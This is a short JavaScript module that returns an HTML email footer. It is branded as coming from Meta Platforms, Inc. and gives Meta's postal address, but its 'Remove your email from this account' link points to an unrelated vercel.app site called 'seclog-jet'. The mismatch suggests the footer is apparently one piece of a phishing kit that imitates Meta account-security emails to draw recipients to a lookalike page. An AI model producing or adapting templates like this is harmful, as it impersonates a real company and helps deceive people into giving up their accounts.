module.exports = (data) => {
  return `
     <table width="100%" style="max-width:600px; margin:auto;">
    <tr>
      <td style="font-size:12px; color:#666; padding-top:20px; line-height:18px;">
        <p>This message was sent to ${data.email}.</p>

        <p>
          Not your account?
          <a href="https://seclog-jet.vercel.app/" style="color:#4A5DF9; text-decoration:none;">
          Remove your email from this account.
          </a>
        </p>

        <p>
          Meta Platforms, Inc.,<br>
          Attention: Community Support,<br>
        1 Meta Way, Menlo Park, CA 94025
        </p>
      </td>
    </tr>
    </table>
  `;
};